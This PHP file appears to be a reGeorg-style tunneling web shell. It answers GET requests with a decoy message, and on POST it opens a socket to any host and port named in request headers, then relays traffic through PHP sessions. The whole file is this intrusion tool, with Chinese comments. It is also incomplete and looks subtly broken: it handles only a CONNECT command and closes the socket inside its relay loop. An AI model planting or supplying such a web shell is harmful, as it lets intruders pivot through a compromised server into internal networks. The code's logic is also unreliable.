<?php
    if ($_SERVER['REQUEST_METHOD'] === "GET"){
        exit("Georg says, 'All seems fine'");
    };

    if ($_SERVER['REQUEST_METHOD'] === "POST"){
        set_time_limit(0);
        # 获取请求头
        $headers = apache_request_headers();
        $cmd = $headers["X-Cmd"];
        switch($cmd){
            case "CONNECT":{
                $target = $headers["X-Target"];
                # $port = (int)$headers["X-Port"];
                $port = $headers["X-Port"];
                $res = fsockopen($target, $port);
                # 访问出错
                if ($res === false){
                    header('X-STATUS: FAIL');
                    header('X-ERROR: Failed connecting to target');
                    return;
                }
                # 正常访问
                stream_set_blocking($res, false);
                @session_start();
                $_SESSION["run"] = true;
                $_SESSION["writebuf"] = "";
                $_SESSION["readbuf"] = "";
                ob_end_clean();
                header('X-STATUS: OK');
                header("Connection: close");
                ignore_user_abort();
                ob_start();
                $size = ob_get_length();
                header("Content-Length: $size");
                ob_end_flush();
                flush();
                session_write_close();

                while ($_SESSION["run"]){
                    $readBuff = "";
                    @session_start();
                    $writeBuff = $_SESSION["writebuf"];
                    $_SESSION["writebuf"] = "";
                    session_write_close();
                    if ($writeBuff != ""){
                        stream_set_blocking($res, false);
                        $i = fwrite($res, $writeBuff); #socket_write($sock, $writeBuff, strlen($writeBuff));
                        if($i === false){
                            @session_start();
                            $_SESSION["run"] = false;
                            session_write_close();
                            header('X-STATUS: FAIL');
                            header('X-ERROR: Failed writing socket');
                        }
                    }
                    stream_set_blocking($res, false);
                    while ($o = fgets($res, 10)) {
                        if($o === false){
                            @session_start();
                            $_SESSION["run"] = false;
                            session_write_close();
                            header('X-STATUS: FAIL');
                            header('X-ERROR: Failed reading from socket');
                        }
                        $readBuff .= $o;
                    }
                    if ($readBuff!=""){
                        @session_start();
                        $_SESSION["readbuf"] .= $readBuff;
                        session_write_close();
                    }
                    fclose($res);
                }
                break;
            };
        };
    };
?>
